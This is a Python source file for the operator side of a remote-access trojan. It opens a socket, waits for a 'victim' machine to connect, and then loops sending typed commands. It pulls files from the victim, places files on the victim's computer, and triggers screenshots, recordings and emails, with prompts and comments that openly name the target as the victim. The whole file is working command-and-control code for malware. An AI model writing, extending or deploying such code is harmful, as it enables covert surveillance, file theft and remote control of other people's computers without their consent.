import socket

s = socket.socket()
s.bind(('127.0.0.1', 9984))
s.listen(1)
server_socket, adress = s.accept()


def take_file():
    # Take from the victim file
    file_path = input("Where do you want save the file?\n")
    with open(file_path, 'wb')as f:
        print('Open File')
        while True:
            data = server_socket.recv(1024)
            if not data or len(data) < 1024:
                if data:
                    f.write(data)
                f.flush()
                f.close()
                break
            f.write(data)


def put_file(data):
    # Send to the victim file
    victim_path = input('Where do you want save the file\n')
    server_socket.sendall(victim_path.encode('utf-8'))
    f = open(data, 'rb')
    while True:
        content = f.read(1024)
        if content:
            server_socket.sendall(content)
        else:
            f.close()
            break


def server():
    print("Connection from: " + str(adress))

    while True:
        command = input('Please enter a command to the victim\n')
        server_socket.send(command.encode('utf-8'))

        if command.startswith('get file '):
            take_file()


        elif command.startswith('download file '):
            command = command[14:-1] + command[-1]
            put_file(command)


        elif command.startswith('send email '):
            data = server_socket.recv(1024).decode('utf-8')
            print(data)

        elif command.startswith('take record '):
            command = command[12:-1] + command[-1]
            server_socket.sendall(command.encode('utf-8'))
            path = input("Where do you want save the file on victim computer\n")
            server_socket.sendall(path.encode('utf-8'))
            take_file()



        elif command.startswith('take screenshot '):
            data = server_socket.recv(1024).decode('utf-8')
            take_file()
            print(data)

        elif command == 'exit':
            break

        else:
            data = server_socket.recv(1024).decode('utf-8')
            print(data)

    server_socket.close()


if __name__ == '__main__':
    server()
